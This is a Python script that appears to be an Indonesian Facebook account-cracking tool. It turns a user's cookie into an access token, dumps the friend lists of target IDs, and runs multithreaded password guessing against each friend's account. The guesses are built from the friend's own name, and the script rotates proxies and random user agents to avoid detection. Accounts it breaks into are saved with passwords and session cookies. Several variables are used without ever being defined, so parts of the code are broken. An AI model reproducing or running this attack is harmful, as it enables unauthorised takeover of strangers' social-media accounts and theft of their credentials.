
###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,time,re,platform,rich
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from time import time as TimeTegar
from rich.tree import Tree
from rich import print as prints
from bs4 import BeautifulSoup as parser
hp = platform.platform()

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
xbz,xnxx = [],[]
tokenefb = []
akunyeh = []
usragent = []
usrgent2 = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
af = 0
ualu,ualuh = [],[]

###----------[ GET PROXY ]----------###
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	baz_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT 1 ]----------###
ugen1 = []
for xd in range(10000):
	rr = random.randint; rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
	bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
	browser = random.choice(['SamsungBrowser/3.0','SamsungBrowser/3.1','SamsungBrowser/3.2','SamsungBrowser/3.3','SamsungBrowser/3.4','SamsungBrowser/3.5','SamsungBrowser/3.6','SamsungBrowser/3.7','SamsungBrowser/3.8','SamsungBrowser/3.9','SamsungBrowser/4.0','SamsungBrowser/2.0','SamsungBrowser/2.1','SamsungBrowser/2.2','SamsungBrowser/2.3','SamsungBrowser/2.4','SamsungBrowser/2.5','SamsungBrowser/2.6','SamsungBrowser/2.7','SamsungBrowser/2.8','SamsungBrowser/2.9','SamsungBrowser/1.0','SamsungBrowser/1.1','SamsungBrowser/1.2','SamsungBrowser/5.0','SamsungBrowser/5.1','SamsungBrowser/5.2','SamsungBrowser/5.3','SamsungBrowser/5.4','SamsungBrowser/5.5','SamsungBrowser/5.6','SamsungBrowser/5.7','SamsungBrowser/5.8','SamsungBrowser/5.9','SamsungBrowser/6.0','SamsungBrowser/6.1','SamsungBrowser/19.0','SamsungBrowser/20.0','SamsungBrowser/21.0','SamsungBrowser/18.0','SamsungBrowser/17.0','SamsungBrowser/16.0','SamsungBrowser/15.0'])
	samsung = random.choice(["SAMSUNG SM-T530","SAMSUNG SM-T805","SAMSUNG SM-G530AZ","SAMSUNG SM-G925K","SAMSUNG SM-G925","SAMSUNG SM-G925T","SAMSUNG SM-T337A","SAMSUNG SM-J110F","SAMSUNG SM-G890A","SAMSUNG SM-T355Y","SAMSUNG SM-T817T","SAMSUNG SM-G925F","SAMSUNG SM-G928F","SAMSUNG SM-W2021"])
	rfn1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {samsung} Build/{bl_typ}.{str(rr(120000,250000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
	rfn2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {samsung} Build/{bl_typ}.{str(rr(120000,250000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(70,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36 {browser}"
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(5,13))}; Redmi {str(rr(4,12))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(5,13))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(5,13))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
	main_ua = random.choice([rfn1,rfn2 ,ugent1 ,ugent2 ,ugent3])
	ugen1.append(main_ua)
	
###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
        
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
afh = 'A2F-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

###----------[ UNTUK ANIMASI ]----------###
def baz_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def baz_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
     
###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	baz_bann(f'''
   _______  _______    _______  
  /"     "||   _  "\  /"     "| 
 (: ______)(. |_)  :)(: ______) 
  \/    |  |:     \/  \/    |   
  // ___)  (|  _  \\  // ___)   
 (:  (     |: |_)  :)(:  (      
  \__/     (_______/  \__/   
''')

###----------[ CEK COKIS TOKEN ]----------###
def login_baz():
	try:
		token = open('.emailbukan.txt','r').read()
		cok = open('.akunbukan.txt','r').read()
		tokenefb.append(token)
		try:
			gerap = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenefb[0], cookies={'cookie':cok})
			nteng = json.loads(gerap.text)['id']
			menu(nteng)
		except KeyError:
			login_men()
		except requests.exceptions.ConnectionError:
			baz_anim(f' Problem with your connection :(')
			exit()
	except IOError:
		login_men()
		
###----------[ BAGIAN LOGIN COKIS ]----------###
def login_men():
	try:
		os.system('clear')
		banner()
		your_cookies = input(f' Cookies :{xxx}{hijo} ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(f" {mer}Login Failed Cookies Invalid ", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							tokenew = open(".emailbukan.txt","w").write(access_token)
							cook= open(".akunbukan.txt","w").write(your_cookies)
							print(f" {hijo}Cookies Valid Login Successful\n")
							print(f" {hijo}{access_token}");exit()
			except Exception as e:
				print(f"{xxx} Cookies have expired")
				os.system('rm -rf .emailbukan.txt && rm -rf .akunbukan.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass

###----------[ BAGIAN MENU ]----------###
def menu(id):
	try:
		token = open('.emailbukan.txt','r').read()
		cok = open('.akunbukan.txt','r').read()
	except IOError:
		os.system('rm -rf .emailbukan.txt && rm -rf .akunbukan.txt')
		baz_anim(f' {xxx}Cookies have expired')
		waktu(1)
		login_men()
	os.system('clear')
	banner()
	print(f'{xxx} 1. Crack publik')
	print(f'{xxx} 2. Crack file')
	print(f'{xxx} 3. Logout')
	helpbas = input(f'{xxx} Choose : ')
	if helpbas in ['1','01','001']:
		nge_krek()
	elif helpbas in ['2','02','002']:
		file_dump()
	elif helpbas in ['3','03','003']:
		os.system('rm -rf .emailbukan.txt')
		os.system('rm -rf .akunbukan.txt')
		print(f'{xxx} Seccess logout')
		exit()
	else:
		exit()

###----------[ DUMP ID PUBLIK ]----------###
def nge_krek():
	try:
		token = open('.emailbukan.txt','r').read()
		cok = open('.akunbukan.txt','r').read()
	except IOError:
		os.system('rm -rf .tokeneakun.txt && rm -rf .akunbukan.txt')
		baz_anim(f'{xxx} Cookies Have Expired...')
		exit()
	try:
		print(f"{xxx} ")
		jum = int(input(f'{xxx} Number of targets : '))
	except ValueError:
		print(f"{xxx} Enter numbers, not letters")
		exit()
	if jum<1 or jum>100:
		print(f"{xxx} Failed dump")
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{xxx} Id to '+str(yz)+' : ')
		uid.append(kl)
	for nidid in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+nidid+'?fields=friends.limit(5000)&access_token='+tokenefb[0],cookies={'cookie': cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f"{xxx} Connection lost")
			exit()
	try:
		print(f'{xxx} Total id : '+str(len(id)))
		atur_dulu()
	except (KeyError,IOError):
		print(f"{xxx} Unpublic friend")
		nge_krek()

###----------[ ATUR SBLUM KREK ]----------###
def atur_dulu():
	print(f'{xxx}')
	print(' 1. old account')
	print(' 2. new account')
	print(' 3. random account')
	aturid = input(f'{xxx} Choose : ')
	if aturid in ['1','01']:
		for akunlama in sorted(id):
			id2.append(akunlama)
	elif aturid in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		waktu(1)
		atur_dulu()
		exit()
		
	print(f'{xxx}')
	print(' 1. New ')
	print(' 2. Graph')
	metod = input(f'{xxx} Choose : ')
	if metod in ['1','01']:
		baz.append('metod1')
	elif metod in ['2','02']:
		baz.append('metod2')
	else:
		baz.append('metod1')
	passwrd()

###----------[ BAGIAN PASSWORD ]----------###
def passwrd():
	global ok,cp
	print(f'{xxx}')
	awal = datetime.datetime.now()
	with tred(max_workers=30) as gas_krek:
		for aldous in id2:
			idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			pwt = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if '><v><' in pwt:
				for xpwn in pwn:
					pwv.append(xpwn)
			else:pass
			if 'metod1' in baz:
				gas_krek.submit(metod1,idf,pwv,awal)
			elif 'metod2' in baz:
				gas_krek.submit(metod2,idf,pwv)
			else:
				gas_krek.submit(metod1,idf,pwv)
	print(f'{xxx}')
	print(f'{hijo}+ {puti}Akun OK  : {hijo}%s{xxx} '%(ok))
	print(f'{kun}+ {puti}Akun CP  : {kun}%s{xxx} '%(cp))
	print(f'{xxx}')
		
###----------[ P.FB ]----------###
resok = []
rescp = []
def metod1(idf,pwv,awal):
	global loop,ok,cp
	jam_tayang = str(datetime.datetime.now()-awal).split('.')[0]
	sys.stdout.write(f" [ {jam_tayang} ] [ {(loop)}/{len(id)} ] [ {hijo}{(ok)}{xxx}/{kun}{(cp)}{xxx} ]           \r");sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			ua = random.choice(ugen1)
			headers1= {
				"Host": "m.facebook.com",
				"cache-control": "max-age=0",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			p = ses.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6IjZmZWE3N2U2MGVjNTRkZWY5OGE1MWQ3NDU4ZWQ0NWFmIn0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D72dd6c57-b440-4989-a018-6b973c491b7f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6IjZmZWE3N2U2MGVjNTRkZWY5OGE1MWQ3NDU4ZWQ0NWFmIn0%253D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":idf,
				"next":f"https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6IjZmZWE3N2U2MGVjNTRkZWY5OGE1MWQ3NDU4ZWQ0NWFmIn0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D72dd6c57-b440-4989-a018-6b973c491b7f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6IjZmZWE3N2U2MGVjNTRkZWY5OGE1MWQ3NDU4ZWQ0NWFmIn0%253D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr",
				"pass":pw,
				"flow":"login_no_pin"}
			headers2 = {
				"Host": "m.facebook.com",
				"connection": "keep-alive",
				"cache-control": "max-age=0",
				"save-data": "on",
				"origin": "https://m.facebook.com",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "com.mi.globalbrowser.mini", 
				"dnt": "1",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-platform": '"Android"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"referer": f"https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6IjZmZWE3N2U2MGVjNTRkZWY5OGE1MWQ3NDU4ZWQ0NWFmIn0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D72dd6c57-b440-4989-a018-6b973c491b7f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6IjZmZWE3N2U2MGVjNTRkZWY5OGE1MWQ3NDU4ZWQ0NWFmIn0%253D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2)
			if "checkpoint" in po.cookies.get_dict():
				cp+=1
				open('CP/'+cph,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{kun}{idf} {pw}{xxx}").add(f"\r{ua}")
				prints(tree)
				break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				ok+=1
				open('OK/'+okh,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{hijo}{idf} {pw}{xxx}").add(f"\r{kuki}")
				prints(tree)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ FREE ]----------###
def metod2(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f" [ crack ] [ {(loop)}/{len(id)} ] [ {hijo}{(ok)}{xxx}/{mer}{(cp)}{xxx} ] \r")
	for pw in pwv:
		try:
			ses = requests.Session()
			ua = random.choice(ugent)
			ua = random.choice(ngentott)
			params = {
					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
					"sdk_version": {random.randint(1,26)}, 
					"email": idf,
					"locale": "en_US",
					"password": pw,
					"sdk": "android",
					"generate_session_cookies": "1",
					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
			headers = {
					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": ua,
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger"
			}
			post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
			if "session_key" in post.text and "EAA" in post.text:
				ok+=1
				coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
				tegarrr = re.findall("c_user=(\d+)",coki)[0]
				open('OK/'+okh,'a').write(f'{tegarrr}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{tegarrr} {pw}").add(f"\r{coki}")
				tree.add(f"\r{xxx}[ {hijo}SUCCESS LOGIN {xxx}]")
				prints(tree)
				break
			elif "User must verify their account" in post.text:
				tegarrr = post.json()["error"]["error_data"]["uid"]
				cp+=1
				open('CP/'+cph,'a').write(f'{tegarrr}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{tegarrr} {pw}").add(f"\r{ua}")
				tree.add(f"\r{xxx}[{mer} CHECKPOINT LOGIN {xxx}]")
				prints(tree)
				break
			elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
				sys.stdout.write(f" [ spam ] [ {(loop)}/{len(id)} ] [ {hijo}{(ok)}{xxx}/{mer}{(cp)}{xxx} ] \r")
				time.sleep(30)
		except requests.exceptions.ConnectionError:
			time.sleep(5)
			metod2(idf,pwv)
	loop+=1

def ceker(idf,pw):
	sess=requests.Session()
	data={}
	data2={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://m.facebook.com/","user-agent":"ua"})
	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):ops.append(print(f" {xxx}{cek[opsi]}"))
	except:pass
	if len(ops)==0:pass
	print (' [+] Columns(ops)')
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))

###----------#[ CREAT FILE ]#----------###
def memulai():
	try:os.mkdir('/sdcard/AKUN-OK')
	except:pass
	try:os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:os.mkdir('A2F')
	except:pass
	login_baz()
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	memulai()